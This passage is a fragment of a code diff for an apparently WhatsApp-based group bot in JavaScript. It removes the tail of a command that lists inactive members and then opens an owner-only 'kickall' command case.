-            return `${index + 1}. @${username}\n   📅 Last active: ${lastActiveDate}\n   ⏰ Days inactive: ${user.daysInactive}\n   ${role}\n`;
-        }).join('\n');
-
-        // Add summary
-        inactiveList += `\n💡 *Tip:* Use \`${prefix}listinactive 30\` to check for members inactive for 30 days`;
-
-        // Get all JIDs for mentions
-        const mentionJids = inactiveUsers.map(user => user.jid);
-
-        await conn.sendMessage(
-            m.chat,
-            {
-                text: inactiveList,
-                mentions: mentionJids
-            },
-            { quoted: m }
-        );
-
-    } catch (error) {
-        console.error('Error in listinactive command:', error);
-        reply('*An error occurred while checking inactive members. Please try again.*');
-    }
-    
-}
 break
 case "kickall": {
     if (!Access) return reply(mess.owner);
